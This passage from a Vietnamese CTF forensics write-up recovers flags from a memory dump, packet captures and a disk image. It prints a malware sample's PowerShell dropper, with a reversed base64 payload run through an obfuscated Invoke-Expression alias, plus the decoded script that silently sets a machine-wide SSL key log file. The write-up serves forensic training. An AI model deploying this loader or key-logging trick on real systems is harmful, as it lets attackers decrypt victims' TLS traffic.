        numArray1 = cryptoTransform4.TransformFinalBlock(inputBuffer, 0, length);
      }
      finally
      {
        ICryptoTransform cryptoTransform5 = cryptoTransform1;
        \u003CModule\u003E.a = (object) numArray1;
        global::b.b = (object) 1876936332;
        flag1 = cryptoTransform5 == null;
        if (!flag1)
          cryptoTransform1.Dispose();
        \u003CModule\u003E.o = -1978466511;
      }
    }
    finally
    {
      ICryptoTransform cryptoTransform6 = cryptoTransform1;
      \u003CModule\u003E.n = -1932913121;
      \u003CModule\u003E.a = (object) null;
      \u003CModule\u003E.f = (object) 1957620381;
      \u003CModule\u003E.c = (object) cryptoTransform6;
      \u003CModule\u003E.q = -1950879357;
      Aes aes6 = aes1;
      Aes aes7 = aes1;
      \u003CModule\u003E.a = (object) flag1;
      \u003CModule\u003E.h = (object) aes7;
      global::b.b = (object) null;
      \u003CModule\u003E.r = 1809257038;
      \u003CModule\u003E.h = (object) null;
      global::b.a = (object) cryptoTransform1;
      \u003CModule\u003E.i = -563903361;
      bool flag3 = aes6 == null;
      \u003CModule\u003E.f = (object) 1818084011;
      if (!flag3)
        aes1.Dispose();
    }
    \u003CModule\u003E.m = 796469985;
    \u003CModule\u003E.o = -1980982856;
    return numArray1;
  }

  private static byte[] c([In] byte[] obj0)
  {
    int num = (int) obj0[obj0.Length - 1];
    byte[] destinationArray = new byte[obj0.Length - num];
    Array.Copy((Array) obj0, (Array) destinationArray, destinationArray.Length);
    return destinationArray;
  }
}
```
Ở hàm b() ta có thể thấy nó sử dụng mã hóa AES trên cổng 1337 với key = `fr33___p4l3571n3`. Giờ ta cần lấy thông tin đã được mã hóa:
```
tshark -2 -r pcapFile.pcapng -R "tcp.port == 1337" -T fields -e data > datafile.txt
## Đoạn thông tin mã hóa
12c6b9acfc4f81810dd21f652bbfd6af6f3171b1be6ae86b058cbee8887f29a361d21ef8f12ff0594c4d217a3feef8a7d993e4c7bb1fea531af0e6259c4b466629e89109ed1d5ba3f3534dacc171266613ae8d24b73bef16426d079dd1d630011899962bd6e1cf2e574ebce9cc224f626fc58fea72add0be454ab6294fe2df119cce1284440e409fc07aa482de82a1b20e449b0133eed2e00a240569c4650ffa
```
Decode nó bằng Cyberchef:
![image](https://hackmd.io/_uploads/rk_pyfAhA.png)
Ta có pass của paste. Strings và grep file memdump để tìm link pastecode.
```
┌──(kali㉿kali)-[~/Downloads/Snooz/snooz_chall]
└─$ strings memdump.mem| grep "pastecode"
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
aa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4ManagedPosition=DeviceId:\\?\DISPLAY#Default_Monitor#4&17f0ff54&0&UID0#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=682,50;Size=320,320Yellow26ca61a2-0663-47cf-9ba9-95e61a6be8c10347e22a-acbf-431b-9a0b-6873fdb426ad
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4ManagedPosition=DeviceId:\\?\DISPLAY#Default_Monitor#4&17f0ff54&0&UID0#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=682,50;Size=320,320Yellow26ca61a2-0663-47cf-9ba9-95e61a6be8c10347e22a-acbf-431b-9a0b-6873fdb426ad
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4ManagedPosition=DeviceId:\\?\DISPLAY#Default_Monitor#4&17f0ff54&0&UID0#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=682,50;Size=320,320Yellow26ca61a2-0663-47cf-9ba9-95e61a6be8c10347e22a-acbf-431b-9a0b-6873fdb426ad
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4ManagedPosition=DeviceId:\\?\DISPLAY#Default_Monitor#4&17f0ff54&0&UID0#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=682,50;Size=320,320Yellow26ca61a2-0663-47cf-9ba9-95e61a6be8c10347e22a-acbf-431b-9a0b-6873fdb426ad
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
aa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4ManagedPosition=DeviceId:\\?\DISPLAY#Default_Monitor#4&17f0ff54&0&UID0#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=682,50;Size=320,320Yellow26ca61a2-0663-47cf-9ba9-95e61a6be8c10347e22a-acbf-431b-9a0b-6873fdb426ad
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4ManagedPosition=DeviceId:\\?\DISPLAY#Default_Monitor#4&17f0ff54&0&UID0#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=682,50;Size=320,320Yellow26ca61a2-0663-47cf-9ba9-95e61a6be8c10347e22a-acbf-431b-9a0b-6873fdb426ad
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4ManagedPosition=DeviceId:\\?\DISPLAY#Default_Monitor#4&17f0ff54&0&UID0#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=682,50;Size=320,320Yellow26ca61a2-0663-47cf-9ba9-95e61a6be8c10347e22a-acbf-431b-9a0b-6873fdb426ad
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4
```
Sau khi mở nó lên bằng pass đã tìm được:
![image](https://hackmd.io/_uploads/SyaPgzC2A.png)
Copy vào Cyberchef, mình biết được nó là 1 file zip. Down nó xuống. Tuy nhiên file zip này yêu cầu pass.Mình crack nó bằng john nhưng không thành công. Nên mình thử mở lại file memdump và để ý thằng notepad.exe. Mình dùng plugin [notepad](https://github.com/spitfirerxf/vol3-plugins) của vol3.
```
192.168.117.12 = ncal ncal pc epmapper epmapper epmapper er epmapper ncal epmapper epmapper ncalrpc \R MACHINE\ ware & \Win ndation. ecti & A TSA: & & @ Windows.Security.EnterpriseData.ProtectionPolicyManagerPrivatePT  !" %   \ l H       % % \ l H       % p %   ( @ @   9 9# WIN10 10.0.2.15 192.168.117.12 Q Negotiate NegoExtender Kerberos NTLM TSSSP pku2u Schannel a \ l H       \ l H             8         8         8     @ @ *Sans titre - Bloc-notes IN10 x % ( 9# WIN10 10.0.2.15 192.168.117.12 x % *Sans titre - Bloc-notes *Sans titre - Bloc-notes * -+ncalrpc:[OLEDFD5E635AC231E044AAE20E7BBFB] % % % @ ) pku2u \RPC T   Ln 1, Col 1 lsapolicylookup NTLM TSSSP \RPC  Windows (CRLF) Ptype_PSFactory T C:\Windows\INF C:\Windows\SYSTEM WIN10 PS C:\Windows\system32 in lasses\A I           8       $ ine\Software\Classes\AppID\notepad.exe 43-1000 \AppID\notepad.exe     8 WIN10 %   $ 9 % 9587-4227533743-1000_Classes 8 \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\LanguagePack\SurrogateFallback \Registry\Machine\SOFTWARE\Microsoft\AppModel\Lookaside\machine\Software\Microsoft\OLE\Tracing q Model\Lookaside\user\software\Classes\AppID\notepad.exe 8 ` `   8     9-8740 @ 8 This is the password for the zip containing all the importante data : Samaqlo@Akasex777  8 \ WIN10 samaqlo 8 L H D " % C 93 ` 32 8 \REGISTRY\MACHINE\SOFTWARE\Classes\CLSID\{11659a23-5884-4d1b-9cf6-67d6f4f90b36} \REGISTRY\MACHINE\SOFTWARE\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} \REGISTRY\MACHINE\SOFTWARE\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} \REGISTRY\MACHINE\SOFTWARE\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} % > Barre d tat Barre d tat xte C:\Windows\system32\DRIVERS MSCTFIME::Function Provider MSAA AccPropServices
```
Pass sẽ là `Samaqlo@Akasex777`. Sau đó ta được 1 file ảnh. Sau một lúc thì mình mở được nó bằng stegseek và tìm được flag.

FLAG: `AKASEC{05-10-2023_free_palestine}`

## 5.For/Sharing not Caring
>My friends and I use the same computer on campus and have a shared folder to exchange files. After submitting the flag for the challenge, it was leaked, and someone obtained it without my knowledge. I'm unsure how they got it.
Author : d33znu75

Challenge cung cấp cho mình 1 file pcapng và 1 file ad1. Mình mở thử wireshark để xem có gì có thể extract từ file pcapng không. Từ Export Objects -> HTTP mình thấy có 1 file sau: 
![image](https://hackmd.io/_uploads/B12t3sZTC.png)
Mình click vào file đầu tiên để xem nó nằm ở luồng nào. Follow luồng để xem kĩ hơn:
![image](https://hackmd.io/_uploads/HJMA3iba0.png)
Mình để ý rằng nó download 1 file exe từ Mediafire.Tuy nhiên, mình thử dùng cả máy ảo và host nhưng đều không tải được. Sau đó mình tìm được [video này](https://www.youtube.com/watch?v=-OBdN3JpPpo&t=217s) và tải nó xuống thành công. Dùng DIE kiểm tra:
```shell
┌──(kali㉿kali)-[~/Downloads]
└─$ diec FREE\ RAM\!.exe --heuristicscan
[!] To get the full heuristic scan result use '--verbose'
[HEUR/About] Generic Heuristic Analysis by DosX (@DosX_dev)
[HEUR] Scanning has begun!
[HEUR/.NET] ByteCode detected: 20????????66
[HEUR/.NET] Object present: Debugger
[HEUR] Scan completed.
PE32
    Linker: Microsoft Linker(11.0)
    Library: .NET Framework(Legacy, CLR v4.0.30319)
    Packer: PS2EXE
    (Heur)Packer: Packer detected
```
1 file .NET. Dùng ILSpy để decompile nó ra, mình chú ý đến file free_raw.ps1 trong phần Resources:
```shell
┌──(kali㉿kali)-[~/Downloads]
└─$ cat free_raw.ps1 
$best64code = "iQWZ0N3bvJGIlJGIuF2Yg0WYyBybuBiLlV3czlGIsF2Yp5GajVGdgI3bmBSeyJ3bzJCIy9mcyVULlRXaydlCNoQDpcSZulGajFWTnACLlxWaGd2bMlXZLx2czRCIscSRMlkRH9ETZV0SMN1UngSZsJWYpJXYWRnbl1mbvJXa25WR0V2U6oTX05WZt52bylmduVkLtVGdzl3UbpQDK0QfK0QZslmRgUGc5RVblRXStASZslmRn9GT5V2SsN3ckACa0FGUtASblRXStcXZOBCIgAiCNsHIpkSZslmRn9GT5V2SsN3ckACa0FGUtQ3clRFKgQ3bu1CKgYWaK0gCNoQDic2bs5SeltGbzNHXr5WacBVVOdUSTxlclJ3bsBHeFBCdl5mclRnbJx1c05WZtV3YvREXjlGbiVHUcNnclNXVcpzQiASPgUGbpZ0ZvxUeltEbzNHJ" ;
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;
$LOADCode = [System.text.EnCOdING]::UTF8.getsTRiNg([sysTEm.coNvErT]::FromBASe64stRInG("$BaSe64")) ;
$PWN = "Inv"+"Oke"+"-ex"+"prE"+"SsI"+"ON" ; nEW-aLIas -naMe PWN -ValuE $pWN -foRce ; pwn $lOadCODe ;
```
Ban đầu mình decode nó bằng base64 nhưng báo lỗi. Sau đó mình để ý đến hàm rev, giờ chỉ cần đảo ngược lại và decode lại, ta được đoạn mã sau:
```
$sslKeyLogFile = "C:\Users\Public\Documents\Internet Explorer\SIGNUP\ink\sslkey.log"


if (-not (Test-Path $sslKeyLogFile)) {
    New-Item -Path $sslKeyLogFile -ItemType File
}

[System.Environment]::SetEnvironmentVariable('SSLKEYLOGFILE', $sslKeyLogFile, 'Machine')

Write-Error "sorry for technical issue. no ram can be boosted
```
Giờ là lúc ta mở file ad1. Mình dùng FTKImage, sau đó extract ra. Check theo đường dẫn ta tìm được file `sslkey.log`. Giờ chỉ cần load nó vào file pcapng. Đây là [hướng dẫn cụ thể](https://docs.fortinet.com/document/fortiweb/7.0.1/administration-guide/291144/decrypting-tls-1-3-traffic). Giải thích cho việc load file sslkey vào thì khi ta mở Wireshark có thể thấy 1 số file `TLS 1.3v`. Sau đó dùng công cụ tìm kiếm trong Wireshark và ta tìm thấy cờ:
![image](https://hackmd.io/_uploads/Hy0QTC-aC.png)

FLAG: `AKASEC{B4s1c_M4lw4r3_4nd_PC4P_4n4lys1s}`

![meme](https://media.tenor.com/wT-64avQxegAAAAi/i-love-you-pepe.gif)